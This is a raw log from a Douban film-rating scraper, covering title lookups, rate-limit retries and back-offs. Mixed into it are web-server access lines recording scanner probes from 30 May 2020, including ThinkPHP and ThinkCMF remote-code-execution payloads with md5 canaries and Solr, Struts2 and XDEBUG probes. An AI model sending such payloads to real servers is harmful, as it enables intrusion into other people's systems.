不解之谜 3293090 6.0保存成功[douban]
金装追女仔 未匹配到合适id
金装追女仔 无豆瓣id数据，存入列表
我的兄弟姐妹 1316513 7.4保存成功[douban]
致命密函 2079752 5.3保存成功[douban]
变种DNA2 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
月满抱西环 1482673 6.7保存成功[douban]
暗斗 3118132 4.4保存成功[douban]
爱你爱我 1297420 6.8保存成功[douban]
极速僵尸 5190188 4.2保存成功[douban]
杨门女将之辕门斩子 19965278 7.7保存成功[douban]
杨门女将之四郎探母 19965276 7.4保存成功[douban]
杨门女将之巧夺凤发 4728508 7.5保存成功[douban]
杨门女将之女儿当自强 匹配到多个豆瓣id数据，存入列表2 ['24748716', '3010220']
杨门女将之皇城惊变 19965272 7.4保存成功[douban]
杨门女将之八妹游春 19965266 7.4保存成功[douban]
杨门女将之大破天门阵 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
杨门女将之昊天塔 19965271 7.5保存成功[douban]
法官妈妈 1867014 6.3保存成功[douban]
泪眼杀星之八百龙兵团 3348668 5.2保存成功[douban]
小鼠爱大米 未匹配到合适id
小鼠爱大米 无豆瓣id数据，存入列表
神谕之谋杀 1303141 6.8保存成功[douban]
幽灵情书 1480013 6.4保存成功[douban]
盖亚奥特曼 盖亚再现 5041039 7.7保存成功[douban]
DNA复制人 未匹配到合适id
DNA复制人 无豆瓣id数据，存入列表
特工神谍 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
武神黑侠 3287845 3.9保存成功[douban]
情不自禁 1550445 8.4保存成功[douban]
五个扑水的少年 1301359 8.4保存成功[douban]
人工智能 1302827 8.6保存成功[douban]
天使爱美丽 1292215 8.7保存成功[douban]
鬼学校 未匹配到合适id
----------地址被限制,稍后重试----------
惊心食人族 1306670 5.9保存成功[douban]
怪医杜立德2 1301788 6.6保存成功[douban]
惊声尖笑2 1308207 6.7保存成功[douban]
美国派2：处男有喜 未匹配到合适id
美国派2：处男有喜 无豆瓣id数据，存入列表
鬼童院 1304044 7.2保存成功[douban]
谁说我不在乎 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
死亡幻觉 1306662 7.3保存成功[douban]
昨天 1308086 8.6保存成功[douban]
K星异客 1306607 8.5保存成功[douban]
海豹突击队2 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 304/378] 182.254.52.17 () {36 vars in 542 bytes} [Sat May 30 10:44:21 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
我的老婆是大佬 未匹配到合适id
----------地址被限制,稍后重试----------
失落的战场 未匹配到合适id
----------地址被限制,稍后重试----------
极地重生 未匹配到合适id
----------地址被限制,稍后重试----------
缘分天注定 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
----------重新启动查找------------
绝色神偷 1304536 6.3保存成功[douban]
血网追凶 1305074 6.8保存成功[douban]
进化危机 1297611 6.8保存成功[douban]
BJ单身日记 1304585 7.5保存成功[douban]
杰森在太空 1303672 5.8保存成功[douban]
正义守望者 1300928 5.8保存成功[douban]
龙与地下城 1304645 5.1保存成功[douban]
浓情巧克力(英语版) 未匹配到合适id
----------地址被限制,稍后重试----------
极限乔丹 1793883 8.8保存成功[douban]
英雄郑成功 1299864 6.6保存成功[douban]
的士速递2 1302271 7.8保存成功[douban]
致命罗密欧 1297670 6.0保存成功[douban]
居家男人 1301886 8.1保存成功[douban]
黑暗中的舞者 匹配到多个豆瓣id数据，存入列表2 ['1291562', '30425469']
碟中谍2 1298525 7.2保存成功[douban]
共同警备区 1306664 8.8保存成功[douban]
西西里的美丽传说 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
午夜凶铃4：贞相大白 未匹配到合适id
午夜凶铃4：贞相大白 无豆瓣id数据，存入列表
古惑仔6胜者为王 未匹配到合适id
古惑仔6胜者为王 无豆瓣id数据，存入列表
刀手 1306988 6.1保存成功[douban]
放荡者 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
死神来了1 未匹配到合适id
死神来了1 无豆瓣id数据，存入列表
神鬼大反扑 1302343 6.0保存成功[douban]
新赤色密室 3161092 4.8保存成功[douban]
流氓师表 1308417 5.7保存成功[douban]
花样年华 1291557 8.6保存成功[douban]
东京攻略 1307043 6.4保存成功[douban]
一见钟情 1307144 7.3保存成功[douban]
朝阳门 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
危机之地 3173026 5.8保存成功[douban]
爱情敏感地带 1926480 5.3保存成功[douban]
咒怨TV版2 未匹配到合适id
咒怨TV版2 无豆瓣id数据，存入列表
咒怨TV版1 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
整九码 1297723 7.0保存成功[douban]
纽约的秋天 1299824 6.4保存成功[douban]
上海正午 1297866 6.4保存成功[douban]
上车走吧 1663415 8.0保存成功[douban]
超时空圣战 1294525 5.6保存成功[douban]
大贏家 1428535 5.5保存成功[douban]
爱与诚 1302904 7.3保存成功[douban]
决战紫禁之巅 未匹配到合适id
----------地址被限制,稍后重试----------
救姜刑警 1302458 7.3保存成功[douban]
赌圣3：无名小子 1478174 6.1保存成功[douban]
中华赌侠 1300381 6.3保存成功[douban]
坏小子特攻 1302379 6.0保存成功[douban]
社团之捻位 3339188 0保存成功[douban]
夕阳古惑仔 3339169 4.6保存成功[douban]
聊斋·席方平 3131867 7.3保存成功[douban]
小亲亲 未匹配到合适id
----------地址被限制,稍后重试----------
雷霆战警 1298104 5.9保存成功[douban]
一见钟情 1307144 7.3保存成功[douban]
神偷次世代 1298869 5.8保存成功[douban]
夜奔 1306465 8.0保存成功[douban]
公元2000 AD 1307875 5.4保存成功[douban]
记忆碎片 1304447 8.6保存成功[douban]
荒岛余生 匹配到多个豆瓣id数据，存入列表2 ['1298653', '35023334']
侠骨仁心 1308254 6.7保存成功[douban]
暴力刑警 2052368 5.8保存成功[douban]
刑杀之法 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
十二夜 1302109 8.2保存成功[douban]
顺流逆流 1308035 7.5保存成功[douban]
自从他来了 1297493 6.4保存成功[douban]
朱丽叶与梁山伯 1304304 8.3保存成功[douban]
星际传奇 1296459 7.2保存成功[douban]
野兽童党 1308385 5.0保存成功[douban]
亡命之逃 1924027 4.5保存成功[douban]
爱杀2000 3339187 3.2保存成功[douban]
猎杀U-571 未匹配到合适id
----------地址被限制,稍后重试----------
死亡网络 2881938 5.2保存成功[douban]
鬼名模 1479958 3.6保存成功[douban]
特警新人类2：机动任务 1302164 5.9保存成功[douban]
辣手回春 1307873 6.2保存成功[douban]
太空游侠 匹配到多个豆瓣id数据，存入列表2 ['1302680', '26363093']
友情岁月山鸡故事 1306098 7.3保存成功[douban]
新赌国仇城 2239925 4.5保存成功[douban]
炭烧凶咒 1476669 6.0保存成功[douban]
天有眼 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
第一次的亲密接触 匹配到多个豆瓣id数据，存入列表2 ['1424748', '26594201']
夏日么么茶 1297291 6.7保存成功[douban]
新盗火线 26337914 0保存成功[douban]
危险关系 未匹配到合适id
危险关系 无豆瓣id数据，存入列表
真味小厨王 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
幸福时光 1297743 7.0保存成功[douban]
睡不着 1302453 7.4保存成功[douban]
西洋镜 1304489 7.4保存成功[douban]
鬼子来了 1291858 9.2保存成功[douban]
红草滩 2340786 5.4保存成功[douban]
非常夏日 1307423 7.6保存成功[douban]
跑马地的月光 未匹配到合适id
----------地址被限制,稍后重试----------
一声叹息 未匹配到合适id
----------地址被限制,稍后重试----------
生化特警之丧尸任务 未匹配到合适id
----------地址被限制,稍后重试----------
入侵脑细胞 未匹配到合适id
----------地址被限制,稍后重试----------
拜见岳父大人 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
----------重新启动查找------------
蓝色爱情 未匹配到合适id
----------地址被限制,稍后重试----------
角斗士 未匹配到合适id
----------地址被限制,稍后重试----------
跳出我天地 1301169 8.8保存成功[douban]
二楼传来的歌声 1295877 8.3保存成功[douban]
惊声尖笑 1299981 6.9保存成功[douban]
猛鬼追魂05 地狱 未匹配到合适id
猛鬼追魂05 地狱 无豆瓣id数据，存入列表
驯鹿游戏 1300807 6.5保存成功[douban]
惊声尖叫3 1293133 6.3保存成功[douban]
红色星球 1304496 6.6保存成功[douban]
逃狱三王 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 305/379] 182.254.52.17 () {36 vars in 605 bytes} [Sat May 30 13:02:51 2020] GET /solr/admin/info/system?wt%3Djson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
怒犯天条 未匹配到合适id
怒犯天条 无豆瓣id数据，存入列表
透明人 1293470 6.7保存成功[douban]
黑帮一号 1306678 7.8保存成功[douban]
飞天舞 韩国版 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
绝地奶霸1 未匹配到合适id
绝地奶霸1 无豆瓣id数据，存入列表
交战规则 1293905 7.3保存成功[douban]
变形黑侠2 未匹配到合适id
变形黑侠2 无豆瓣id数据，存入列表
八毫米 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
处刑人 1469049 8.2保存成功[douban]
悍将奇兵1999 未匹配到合适id
悍将奇兵1999 无豆瓣id数据，存入列表
双重危机 匹配到多个豆瓣id数据，存入列表2 ['1292676', '26584800']
告别汉堡 1760316 7.3保存成功[douban]
没事偷着乐 未匹配到合适id
没事偷着乐 无豆瓣id数据，存入列表
黑马王子 1305594 6.1保存成功[douban]
木乃伊1 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
一个都不能少 1294963 7.6保存成功[douban]
新家法 2084048 6.4保存成功[douban]
天才瑞普利 1295045 8.2保存成功[douban]
秘密1999 未匹配到合适id
秘密1999 无豆瓣id数据，存入列表
搏击俱乐部 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
深海狂鲨 1292680 7.2保存成功[douban]
大开眼戒 1300275 7.9保存成功[douban]
午夜凶铃2：贞子缠身 1294506 6.6保存成功[douban]
星球大战前传1：幽灵的威胁 1294362 8.2保存成功[douban]
古惑仔激情篇之洪兴大飞哥 1300183 6.3保存成功[douban]
007之黑日危机 1293174 7.5保存成功[douban]
英伦四月天 1292929 7.4保存成功[douban]
枪火 1300741 8.7保存成功[douban]
爆裂刑警 未匹配到合适id
----------地址被限制,稍后重试----------
娱乐之王 1298934 5.5保存成功[douban]
安娜与国王 1300242 6.7保存成功[douban]
给您道喜啦 4305913 0保存成功[douban]
女巫布莱尔 1295831 6.4保存成功[douban]
爱情梦幻号 1308384 5.7保存成功[douban]
暗战 1298898 8.5保存成功[douban]
古镜怪谈 1305655 5.8保存成功[douban]
半支烟 1304469 7.2保存成功[douban]
鬼请你睇戏 未匹配到合适id
----------地址被限制,稍后重试----------
龙在边缘 1303983 7.0保存成功[douban]
黑道风云之收数王 1303256 6.2保存成功[douban]
化骨龙与千年虫 1434049 5.9保存成功[douban]
中华英雄 1294671 6.4保存成功[douban]
特警新人类 1299048 6.3保存成功[douban]
史前巨鳄 1295387 5.8保存成功[douban]
边缘战士 1302300 6.3保存成功[douban]
夜叉 3254242 6.3保存成功[douban]
甜言蜜语 未匹配到合适id
----------地址被限制,稍后重试----------
魔鬼教师 1479974 5.1保存成功[douban]
山村老尸 1305114 6.8保存成功[douban]
逆我者死 1307364 6.4保存成功[douban]
绿里奇迹 1300374 8.8保存成功[douban]
那山那人那狗 1307766 8.6保存成功[douban]
第六感 匹配到多个豆瓣id数据，存入列表2 ['1297630', '1295001']
心动 1292289 8.2保存成功[douban]
好孩子 1946870 6.5保存成功[douban]
相约2000年 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
春风得意梅龙镇 1461148 6.6保存成功[douban]
原始武器 未匹配到合适id
原始武器 无豆瓣id数据，存入列表
赌王千霸之光棍遇着无皮柴 26281397 0保存成功[douban]
男妇女主任 1783537 7.3保存成功[douban]
星愿 1294927 7.2保存成功[douban]
宋朝风月 26820408 0保存成功[douban]
AK47之天网 未匹配到合适id
AK47之天网 无豆瓣id数据，存入列表
我的1919 1316511 8.3保存成功[douban]
医神 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
旺角靓妹仔 2294173 0保存成功[douban]
怪异集之你回来吧 1479925 0保存成功[douban]
阳光警察 1299150 6.3保存成功[douban]
神探幻影 匹配到多个豆瓣id数据，存入列表2 ['2259813', '1295669']
一吻定江山 1293896 6.5保存成功[douban]
心猿意马 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
横空出世 1464526 9.3保存成功[douban]
绿色柔情 未匹配到合适id
----------地址被限制,稍后重试----------
美丽新世界 未匹配到合适id
----------地址被限制,稍后重试----------
洗澡 未匹配到合适id
----------地址被限制,稍后重试----------
说出你的秘密 未匹配到合适id
----------地址被限制,稍后重试----------
亿万未婚夫 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
----------重新启动查找------------
巴黎圣母院 20326557 9.4保存成功[douban]
美国派1 未匹配到合适id
美国派1 无豆瓣id数据，存入列表
弦动我心 1299176 8.0保存成功[douban]
感官游戏 1299213 7.1保存成功[douban]
狗男女 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
麻辣教师电影版 1421734 7.5保存成功[douban]
总有骄阳 1296821 8.2保存成功[douban]
处女自杀 1297894 7.5保存成功[douban]
落跑新娘 1299922 6.8保存成功[douban]
男孩不哭 1300528 8.1保存成功[douban]
圣女贞德（1999版） 未匹配到合适id
圣女贞德（1999版） 无豆瓣id数据，存入列表
幽灵狗：忍者之路 1303449 7.5保存成功[douban]
美丽罗塞塔 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
飙风战警 1293364 6.8保存成功[douban]
窈窕美眉 1298489 6.1保存成功[douban]
9413 1295633 7.0保存成功[douban]
杭州王爷 1307471 5.2保存成功[douban]
惊天大贼王 1850714 6.1保存成功[douban]
花木兰 未匹配到合适id
----------地址被限制,稍后重试----------
楚门的世界 1292064 9.3保存成功[douban]
拯救大兵瑞恩 1292849 9.0保存成功[douban]
的士速递 1294262 7.8保存成功[douban]
义侠勇闯上海滩 1892592 5.7保存成功[douban]
星际旅行9：起义 1295383 7.3保存成功[douban]
哥斯拉1998版 未匹配到合适id
----------地址被限制,稍后重试----------
细细的红线 1292781 7.8保存成功[douban]
天浴 未匹配到合适id
天浴 无豆瓣id数据，存入列表
午夜凶铃 匹配到多个豆瓣id数据，存入列表2 ['1307696', '1482354']
异种2 1295204 5.9保存成功[douban]
古惑仔5之龙争虎斗 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
古惑仔情义篇之洪兴十三妹 1307345 7.2保存成功[douban]
新古惑仔之少年激斗篇 1307899 6.4保存成功[douban]
天生一对 1297102 8.3保存成功[douban]
兵人 1294353 7.0保存成功[douban]
鬼骨场 未匹配到合适id
鬼骨场 无豆瓣id数据，存入列表
豹妹 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 306/380] 111.229.100.48 () {34 vars in 501 bytes} [Sat May 30 14:47:29 2020] GET /TP/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24505|app: 0|req: 11/381] 111.229.100.48 () {34 vars in 487 bytes} [Sat May 30 14:47:29 2020] GET /TP/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24507|app: 0|req: 55/382] 111.229.100.48 () {34 vars in 523 bytes} [Sat May 30 14:47:29 2020] GET /thinkphp/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24507|app: 0|req: 56/383] 111.229.100.48 () {34 vars in 505 bytes} [Sat May 30 14:47:29 2020] GET /html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24505|app: 0|req: 12/384] 111.229.100.48 () {34 vars in 495 bytes} [Sat May 30 14:47:29 2020] GET /public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24506|app: 0|req: 12/385] 111.229.100.48 () {34 vars in 511 bytes} [Sat May 30 14:47:29 2020] GET /TP/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24506|app: 0|req: 13/386] 111.229.100.48 () {34 vars in 483 bytes} [Sat May 30 14:47:29 2020] GET /elrekt.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24507|app: 0|req: 57/387] 111.229.100.48 () {34 vars in 481 bytes} [Sat May 30 14:47:29 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24506|app: 0|req: 14/388] 111.229.100.48 () {34 vars in 466 bytes} [Sat May 30 14:47:29 2020] GET / => generated 179 bytes in 0 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
爱在娱乐圈的日子 未匹配到合适id
爱在娱乐圈的日子 无豆瓣id数据，存入列表
新唐山大兄 1892592 5.7保存成功[douban]
每天爱你8小时 1295681 7.2保存成功[douban]
超时空要爱 1297148 7.1保存成功[douban]
铁面人 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
佐罗的面具 1293225 7.5保存成功[douban]
我是谁 1300303 7.5保存成功[douban]
尖峰时刻 1292624 7.1保存成功[douban]
杀杀人、跳跳舞 1295419 6.2保存成功[douban]
非常警察 2244265 5.5保存成功[douban]
龙在江湖 1303769 7.0保存成功[douban]
王牌对王牌 1293434 8.5保存成功[douban]
国家公敌 未匹配到合适id
----------地址被限制,稍后重试----------
替身杀手 1293227 5.9保存成功[douban]
猛鬼食人胎 1308355 5.9保存成功[douban]
两杆大烟枪 1293350 9.1保存成功[douban]
风云雄霸天下 1295469 6.9保存成功[douban]
安娜玛德莲娜 1301974 7.4保存成功[douban]
真心英雄 1293202 7.8保存成功[douban]
新恋爱世纪 1468903 6.5保存成功[douban]
玻璃之城 1303590 7.9保存成功[douban]
侠盗正传 未匹配到合适id
----------地址被限制,稍后重试----------
美少年之恋 1306317 7.5保存成功[douban]
烈火青春 1947381 6.9保存成功[douban]
没有小鸟的天空 2068116 6.1保存成功[douban]
全职大盗 1995646 5.9保存成功[douban]
野兽刑警 1297683 7.6保存成功[douban]
蝎子之策反行动 未匹配到合适id
蝎子之策反行动 无豆瓣id数据，存入列表
香港第一凶宅 1304023 5.3保存成功[douban]
幻影特攻 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
初夏之恋 19897675 0保存成功[douban]
初缠恋后的2人世界 未匹配到合适id
初缠恋后的2人世界 无豆瓣id数据，存入列表
天生绝配 3235973 6.3保存成功[douban]
生化寿尸 1394470 6.6保存成功[douban]
死神通告 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 307/389] 182.254.52.17 () {36 vars in 605 bytes} [Sat May 30 15:02:52 2020] GET /?XDEBUG_SESSION_START%3Dphpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
追随 1397546 8.9保存成功[douban]
碧血蓝天 未匹配到合适id
碧血蓝天 无豆瓣id数据，存入列表
憨豆豆追女仔 3151754 6.1保存成功[douban]
不见不散 1307014 7.8保存成功[douban]
对不起，干掉你 3627894 4.1保存成功[douban]
血仍是冷 3715749 0保存成功[douban]
面青青有排惊 1479903 4.8保存成功[douban]
别恋1998 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
红娘 2061179 6.3保存成功[douban]
生死恋 1483880 6.8保存成功[douban]
网上鬼妻 未匹配到合适id
网上鬼妻 无豆瓣id数据，存入列表
愈堕落，愈英雄 1308114 7.3保存成功[douban]
亲情无价 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
无间道长之神剑门 26337916 0保存成功[douban]
古惑仔：以暴制暴 未匹配到合适id
----------地址被限制,稍后重试----------
永恒的一天 未匹配到合适id
----------地址被限制,稍后重试----------
荆轲刺秦王 未匹配到合适id
----------地址被限制,稍后重试----------
时空急转弯2 未匹配到合适id
----------地址被限制,稍后重试----------
鬼娃回魂4 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
----------重新启动查找------------
怪医杜立德 未匹配到合适id
----------地址被限制,稍后重试----------
伊丽莎白 1296223 7.7保存成功[douban]
第六感生死缘 1299769 7.9保存成功[douban]
自由的代价 1422897 7.7保存成功[douban]
赌王之王 匹配到多个豆瓣id数据，存入列表2 ['1293090', '1299693']
绝世天劫 1292769 7.8保存成功[douban]
红色小提琴 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
浪人 1295527 7.6保存成功[douban]
西伯利亚的理发师 1303001 8.7保存成功[douban]
电子情书 1293555 7.8保存成功[douban]
终极密码战 1296705 6.7保存成功[douban]
跳跃大搜查线1 未匹配到合适id
跳跃大搜查线1 无豆瓣id数据，存入列表
美梦成真 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
我仍然知道你去年夏天干了什么 1292836 5.9保存成功[douban]
夺金暴潮 1297677 6.7保存成功[douban]
千钧一发 1300117 8.8保存成功[douban]
狙击职业杀手 1294863 6.8保存成功[douban]
悍将奇兵1997 未匹配到合适id
----------地址被限制,稍后重试----------
势不两立 1292898 7.9保存成功[douban]
安娜·卡列尼娜 1292577 7.5保存成功[douban]
复仇的怒火 未匹配到合适id
复仇的怒火 无豆瓣id数据，存入列表
光猪六壮士 匹配到多个豆瓣id数据，存入列表2 ['1292541', '30133237']
特工狂花 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 308/390] 162.243.143.28 () {34 vars in 422 bytes} [Sat May 30 16:14:19 2020] GET /portal/redlion => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
天才与白痴1997 未匹配到合适id
天才与白痴1997 无豆瓣id数据，存入列表
阴阳路 全20部 未匹配到合适id
阴阳路 全20部 无豆瓣id数据，存入列表
心慌方 1305903 7.9保存成功[douban]
再生侠 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
狂蟒之灾 1300830 6.6保存成功[douban]
黑衣人 1301445 8.1保存成功[douban]
古惑仔4之战无不胜 未匹配到合适id
古惑仔4之战无不胜 无豆瓣id数据，存入列表
一树梨花压海棠 1296778 8.2保存成功[douban]
007之明日帝国 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
霹雳战士 6961242 0保存成功[douban]
黑金 1292962 7.7保存成功[douban]
夜半3点钟 1479884 5.7保存成功[douban]
[pid: 24504|app: 0|req: 309/391] 182.254.52.17 () {36 vars in 592 bytes} [Sat May 30 16:22:11 2020] GET /video/play/82978/1-8.html => generated 19553 bytes in 11 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
战狼传说 1293516 6.4保存成功[douban]
半生缘 1299624 7.8保存成功[douban]
黑狱断肠歌之砌生猪肉 1394466 7.1保存成功[douban]
异形4 1299153 7.6保存成功[douban]
一个好人 未匹配到合适id
----------地址被限制,稍后重试----------
黑玫瑰义结金兰 1499719 6.9保存成功[douban]
天地雄心 1305187 5.8保存成功[douban]
精装难兄难弟 1305058 7.7保存成功[douban]
豪情盖天 1293678 6.5保存成功[douban]
回转寿尸 1306345 6.5保存成功[douban]
心灵捕手 1292656 8.9保存成功[douban]
爱您爱到杀死您 1302607 6.3保存成功[douban]
麻雀飞龙 1764897 6.9保存成功[douban]
天庭外传 未匹配到合适id
----------地址被限制,稍后重试----------
猛鬼通宵陪住你 1307022 6.3保存成功[douban]
最佳拍档之醉街拍档 1306562 6.1保存成功[douban]
忠奸人 1293731 8.1保存成功[douban]
G4特工 未匹配到合适id
G4特工 无豆瓣id数据，存入列表
误人子弟 1299998 7.1保存成功[douban]
爱上百分百英雄 1294772 6.4保存成功[douban]
第五元素 1293531 7.9保存成功[douban]
鲁滨逊漂流记1997 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 310/392] 197.240.188.193 () {40 vars in 2589 bytes} [Sat May 30 16:33:05 2020] GET /struts2-rest-showcase/orders.xhtml => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24506|app: 0|req: 15/393] 197.240.188.193 () {40 vars in 2523 bytes} [Sat May 30 16:33:05 2020] GET /index.action => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24505|app: 0|req: 13/394] 197.240.188.193 () {40 vars in 2511 bytes} [Sat May 30 16:33:06 2020] GET /index.do => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
神偷谍影 1295157 6.8保存成功[douban]
马永贞 1304694 6.9保存成功[douban]
火烧岛之横行霸道 1482363 6.7保存成功[douban]
两个只能活一个 1296623 7.7保存成功[douban]
甲方乙方 1303173 8.3保存成功[douban]
夜半2点钟 1479883 5.6保存成功[douban]
完全结婚手册 1296089 6.6保存成功[douban]
我爱厨房 1295179 7.4保存成功[douban]
花季·雨季 1464633 6.9保存成功[douban]
拥抱朝阳 1302137 6.5保存成功[douban]
飞一般爱情小说 未匹配到合适id
----------地址被限制,稍后重试----------
等你回来 3037311 0保存成功[douban]
给太太打工 1483581 6.0保存成功[douban]
冲破死亡游戏 4122145 0保存成功[douban]
黑白英烈 3158719 7.4保存成功[douban]
洛城机密 1292348 8.7保存成功[douban]
初恋无限Touch 1298822 7.4保存成功[douban]
憨星先生 1303715 5.5保存成功[douban]
春光乍泄 1292679 8.9保存成功[douban]
变脸 1292659 8.5保存成功[douban]
南海十三郎 未匹配到合适id
----------地址被限制,稍后重试----------
格斗之王2大歼灭 1297265 5.0保存成功[douban]
警察帝国 1292751 6.7保存成功[douban]
惊声尖叫2 1299495 6.4保存成功[douban]
2013终极神差 1298753 7.5保存成功[douban]
我爱的男人 1820109 8.2保存成功[douban]
末日戒备 1293506 6.6保存成功[douban]
活火熔城 未匹配到合适id
----------地址被限制,稍后重试----------
我知道你去年夏天干了什么 未匹配到合适id
----------地址被限制,稍后重试----------
魔鬼女大兵 未匹配到合适id
----------地址被限制,稍后重试----------
终极悍将 未匹配到合适id
----------地址被限制,稍后重试----------
断箭 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 311/395] 58.247.212.239 () {36 vars in 595 bytes} [Sat May 30 17:18:24 2020] GET /streaming/clients_live.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 312/396] 195.54.160.130 () {34 vars in 556 bytes} [Sat May 30 17:21:20 2020] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 313/397] 195.54.160.130 () {36 vars in 653 bytes} [Sat May 30 17:24:39 2020] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24507|app: 0|req: 58/398] 195.54.160.130 () {34 vars in 556 bytes} [Sat May 30 17:24:40 2020] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
----------重新启动查找------------
轰天奇兵 1300846 5.1保存成功[douban]
逃出洛杉矶 1293137 6.4保存成功[douban]
不归路1996 未匹配到合适id
不归路1996 无豆瓣id数据，存入列表
霹雳神鹰 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
罗密欧与朱丽叶之后现代激情篇 未匹配到合适id
罗密欧与朱丽叶之后现代激情篇 无豆瓣id数据，存入列表
异形魔怪2 1304312 6.3保存成功[douban]
龙卷风 匹配到多个豆瓣id数据，存入列表2 ['1292454', '3059537']
谈谈情跳跳舞-日版 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 314/399] 195.54.160.130 () {34 vars in 716 bytes} [Sat May 30 17:32:01 2020] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
新上海滩 匹配到多个豆瓣id数据，存入列表2 ['1293142', '2248658']
食神 1293351 8.0保存成功[douban]
变脸[1996] 未匹配到合适id
变脸[1996] 无豆瓣id数据，存入列表
碟中谍 1292484 8.1保存成功[douban]
星际旅行8：第一类接触 1299888 7.8保存成功[douban]
古惑仔3之只手遮天 1301283 7.7保存成功[douban]
微观世界 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
古惑仔2之猛龙过江 1473074 7.6保存成功[douban]
洪兴仔之江湖大风暴 1480318 6.4保存成功[douban]
古惑仔1之人在江湖 未匹配到合适id
古惑仔1之人在江湖 无豆瓣id数据，存入列表
赌神3之少年赌神 1301381 6.9保存成功[douban]
警察故事4：简单任务 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
